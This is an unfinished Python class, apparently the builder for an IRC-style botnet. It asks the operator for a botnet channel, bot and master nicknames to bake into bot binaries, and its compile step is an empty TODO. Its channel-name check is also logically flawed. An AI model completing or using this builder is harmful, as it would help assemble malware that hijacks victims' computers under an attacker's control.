import subprocess
import os

class BotCompiler:
    def __init__(self, serverAddress, validatePassHash):
        self.serverAddress = serverAddress
        self.validatePassHash = validatePassHash
        self.masterNick = "master"
        self.assignedChannel = ""
        self.botNick = ""
        self.botUser = ""

    
    def setMacros(self):
        print("=========================Bot Macros setup=========================")
        print("(Note: these values will be passed to the bot as essentially compilation time params)")
        assignedChannel = input("Enter a botnet channel name (must start with '#'): ") # TODO: specify that a comma seperated list of channels are allowed
        if assignedChannel[0] != "#" and len(assignedChannel) > 60:
            print("Error: invalid channel name")
            return False

        botNick = input("Enter a bot nickname (Note: every bot process will generate a random 8 digit appendix to differentiate itself, but the base name is set here): ")
        if len(botNick) > 50:
            print("Bot nick too long")
            return False
        botUser = input("Enter a bot username: ")
        if len(botUser) > 50:
            print("Bot user too long")
            return False
        
        masterNick = input("Enter the nickname of the master (Note: if you have auto-connected, or plan to, the nick is 'master') ")
        if len(masterNick) > 50:
            print("Master nick too long")
            return False
        
        self.assignedChannel = assignedChannel
        self.botUser = botUser
        self.botNick = botNick
        self.masterNick = masterNick
        return True

    def compilationSetup(self):
        setMacrosResult = False
        while not setMacrosResult:
            setMacrosResult = self.setMacros() 
        # TODO
        

        

        


        
